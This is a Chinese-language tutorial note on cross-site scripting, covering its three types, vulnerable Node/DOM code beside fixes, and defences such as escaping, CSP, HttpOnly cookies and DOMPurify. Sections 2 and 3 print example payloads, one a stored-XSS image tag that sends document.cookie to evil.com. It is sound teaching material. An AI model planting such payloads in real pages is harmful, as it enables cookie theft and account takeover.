# XSS（跨站脚本攻击）

> 一句话定位：**XSS —— 让攻击者的代码"跑在别人的浏览器里"**

XSS（Cross-Site Scripting，为避免与 CSS 混淆缩写为 XSS）是 OWASP Top 10 常年位居前列的攻击方式。核心思路只有一句话：**把恶意脚本"注入"到受害者访问的页面中，让浏览器替你执行**。

---
## 引言：生产 Bug（[AUTO] 自动生成，待人工 review）

XSS（跨站脚本攻击） 的一句话定位：**XSS —— 让攻击者的代码"跑在别人的浏览器里"**

**但实际**：常被攻击或出 Bug 后背锅。本篇用'生产场景'切入：
线上怎么炸、有没有上线过的坑、为什么按官方文档写也会错。

> 📌 本段由 `note/scripts/add-intro.py` 自动生成（场景模板 + README 摘录）。**下次 review 时请改为真实场景 + 数字 + 反思**，目前仅满足'有引言'的最低要求。

---



## 1. XSS 的三类形态

```mermaid
graph TB
  A[XSS 三类] --> B[反射型 XSS<br/>Reflected]
  A --> C[存储型 XSS<br/>Stored]
  A --> D[DOM 型 XSS<br/>DOM-based]
  B --> B1[恶意脚本在 URL 参数<br/>服务端"反射"回响应]
  C --> C1[恶意脚本存入数据库<br/>其他用户访问时读出]
  D --> D1[前端 JS 直接把 URL<br/>写入 DOM]
  style A fill:#e3f2fd
  style B fill:#fff8e1
  style C fill:#ffebee
  style D fill:#e8f5e9
```

| 类型 | 注入位置 | 触发条件 | 危害范围 |
|------|---------|---------|---------|
| **反射型** | URL 参数 → 服务端 → HTML 响应 | 用户点击恶意链接 | 仅点击者本人 |
| **存储型** | 表单 → 数据库 → 所有访问者的页面 | 任何人访问页面 | **所有访问者**（最危险） |
| **DOM 型** | URL 参数 / 外部数据 → 前端 JS → DOM | 前端代码使用危险 API | 仅当前用户 |

---

## 2. 反射型 XSS 详解

### 攻击流程
1. 攻击者构造恶意 URL：`https://example.com/search?q=<script>alert(document.cookie)</script>`
2. 诱导用户点击（邮件、聊天、钓鱼）
3. 服务端把 `q` 参数原样塞入 HTML 响应：`<p>搜索结果：<script>alert(document.cookie)</script></p>`
4. 浏览器执行脚本 → Cookie 被窃取

### 易感场景
- 搜索框回显用户关键词
- 错误页面显示 URL 参数
- 任何"把 URL 参数渲染回 HTML"的功能

```javascript
// ❌ 易感的服务端代码（Node.js 示例）
app.get('/search', (req, res) => {
  const q = req.query.q
  res.send(`<html><body>搜索：<strong>${q}</strong></body></html>`)
})

// ✅ 修复：转义后输出
import escapeHtml from 'escape-html'
app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q)
  res.send(`<html><body>搜索：<strong>${q}</strong></body></html>`)
})
```

---

## 3. 存储型 XSS 详解

### 攻击流程
1. 攻击者在论坛发帖：`<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
2. 帖子保存到数据库
3. 所有访问该帖子的用户，浏览器都会执行 `onerror` 里的恶意代码
4. Cookie、Session Token、用户操作全部被劫持

### 易感场景
- 评论区 / 论坛 / 聊天室
- 用户个人主页（昵称、签名）
- 富文本编辑器内容
- 任何"用户输入 → 存储 → 其他用户展示"的链路

> **危害最大**：存储型 XSS 是"一次注入、多人中招"的被动攻击，常被用于钓鱼和账号接管。

---

## 4. DOM 型 XSS 详解

### 攻击流程
1. 前端 JS 读取 URL 数据：`const data = location.hash.slice(1)`
2. 把数据写入 DOM：`document.getElementById('output').innerHTML = data`
3. 攻击者构造 URL：`https://example.com/page#<img src=x onerror=...>`

### 易感的前端危险 API

| API | 风险 | 安全替代 |
|-----|------|---------|
| `element.innerHTML = x` | 执行 HTML / 脚本 | `element.textContent = x` |
| `document.write(x)` | 直接写 HTML | `document.createElement()` |
| `eval(x)` | 执行任意 JS | 永远不要用 `eval` |
| `setTimeout(x, 0)` | 当 x 是字符串时等同 `eval` | 传函数而非字符串 |
| `location.href = x` | 跳转到恶意 URL | 校验 URL 协议 |
| `$(selector).html(x)` | jQuery 等同 innerHTML | `.text(x)` |

```javascript
// ❌ DOM 型 XSS 易感代码
function renderWelcome() {
  const name = new URLSearchParams(location.search).get('name')
  document.getElementById('welcome').innerHTML = `Hello, ${name}!`
}

// ✅ 修复：用 textContent
function renderWelcome() {
  const name = new URLSearchParams(location.search).get('name')
  document.getElementById('welcome').textContent = `Hello, ${name}!`
}
```

---

## 5. 防御体系

### 5.1 输入校验（Input Validation）

**白名单优先于黑名单**：
- ✅ 邮箱：只允许 `a-z0-9@.`
- ✅ 数字：只允许 `0-9`
- ❌ 不要试图"屏蔽 `<script>`"，攻击者可以用 `<img onerror=...>` 等变体绕过

### 5.2 输出编码（Output Encoding）

**根据输出上下文选择编码**：

| 输出上下文 | 编码方式 | 工具 |
|-----------|---------|------|
| HTML 文本 | HTML 实体编码 (`<` → `&lt;`) | `escape-html`、框架自动转义 |
| HTML 属性 | 属性编码 | 同上 |
| JavaScript 字符串 | JS 字符串编码 | JSON.stringify |
| URL 参数 | URL 编码 | `encodeURIComponent()` |
| CSS 值 | CSS 编码 | 避免动态 CSS |

### 5.3 框架默认转义（最重要防线）

**React / Vue / Svelte 默认自动转义所有插值**：
```tsx
// React：自动转义，{html} 被安全渲染为文本
function Page({ html }) {
  return <div>{html}</div>  // ✅ 安全
}

// React：dangerouslySetInnerHTML 才渲染 HTML
function Page({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />  // ⚠️ 危险，需要确保 html 已消毒
}
```

```vue
<!-- Vue：默认转义 -->
<template>
  <div>{{ userInput }}</div>  <!-- ✅ 安全 -->
  <div v-html="userInput"></div>  <!-- ⚠️ 危险，需要确保已消毒 -->
</template>
```

### 5.4 CSP（内容安全策略）

**最后一道防线**：通过 HTTP 头禁止内联脚本和不可信来源的脚本。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'
```

详见 → [../csp/](../csp/)

### 5.5 HttpOnly Cookie

**防止 Cookie 被 JS 窃取**：
```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
```

详见 → [../sessions/](../sessions/)

---

## 6. 富文本场景的安全处理

当业务必须渲染 HTML（博客、富文本评论、Markdown）时：

```javascript
import DOMPurify from 'dompurify'

// ✅ 使用白名单库消毒 HTML
const rawHtml = '<p>Hello</p><script>alert(1)</script>'
const cleanHtml = DOMPurify.sanitize(rawHtml)
// → '<p>Hello</p>'

// 渲染
element.innerHTML = cleanHtml
```

| 库 | 作用 |
|----|------|
| **DOMPurify** | 最流行的 HTML 消毒库（客户端 + Node） |
| **sanitize-html** | Node.js 专用，白名单配置灵活 |
| **Markdown 库**（marked + DOMPurify） | Markdown → HTML → 消毒 → 渲染 |

---

## 7. React / Vue 生态的 XSS 陷阱

| 框架 | 陷阱 | 安全做法 |
|------|------|---------|
| **React** | `dangerouslySetInnerHTML` | 必须搭配 DOMPurify |
| **Vue** | `v-html` | 必须搭配 DOMPurify |
| **React** | `javascript:` 协议 href | 校验 URL 协议（`<a href={validate(url)}>`） |
| **Vue / React** | 第三方 `<iframe>` | `sandbox` 属性 |
| **Next.js** | `next/link` 对 `javascript:` 自动拦截 | 默认安全 |
| **所有框架** | `eval`、`new Function` | 永远不要用 |

---

## 8. XSS 与 CSRF 的关系

| 维度 | XSS | CSRF |
|------|-----|------|
| 攻击目标 | 用户（窃取数据） | 服务端（冒名操作） |
| 攻击手段 | 注入脚本 | 伪造请求 |
| 依赖 | 浏览器执行恶意代码 | 浏览器自动携带 Cookie |
| **相互影响** | XSS **可以绕过 CSRF 防护**（直接构造请求） | CSRF 不能导致 XSS |

> **关键洞见**：**防御 XSS 是 CSRF 防护的基础**。一旦存在 XSS，CSRF Token 也能被脚本窃取。

---

## 9. 测试与审计

| 工具 | 类型 | 适用 |
|------|------|------|
| **OWASP ZAP** | 自动化扫描 | 集成 CI |
| **Burp Suite** | 手动渗透测试 | 专业安全测试 |
| **ESLint 插件** | `eslint-plugin-no-unsanitized` | 代码扫描 |
| **Snyk Code** | SAST（静态分析） | 代码扫描 |

---

## 10. 实战检查清单

- [ ] 所有用户输入在输出时**必须编码**
- [ ] 使用框架默认转义（React `{}` / Vue `{{ }}`），避免 `dangerouslySetInnerHTML` / `v-html`
- [ ] 富文本必须用 DOMPurify 消毒
- [ ] 配置 CSP，禁用内联脚本
- [ ] Cookie 设置 HttpOnly + Secure + SameSite
- [ ] URL 跳转校验协议（禁止 `javascript:`）
- [ ] 第三方 iframe 加 `sandbox`
- [ ] CI 集成静态代码扫描（ESLint 插件 / Snyk Code）
- [ ] 定期 OWASP ZAP 自动扫描

---

## 11. 交叉引用

- [`07-security/csp/`](../csp/) — CSP：XSS 的最后一道防线
- [`07-security/csrf/`](../csrf/) — CSRF：另一种客户端攻击
- [`07-security/sessions/`](../sessions/) — HttpOnly Cookie 保护会话
- [`03-frameworks/`](../../03-frameworks/) — 框架默认转义机制

---

## 12. 与其他模块的关系

- **上游**：[`07-security/`](../)（安全总览）、[`03-frameworks/`](../../03-frameworks/)（框架默认转义）
- **下游**：被所有应用层复用（任何接收用户输入的地方）
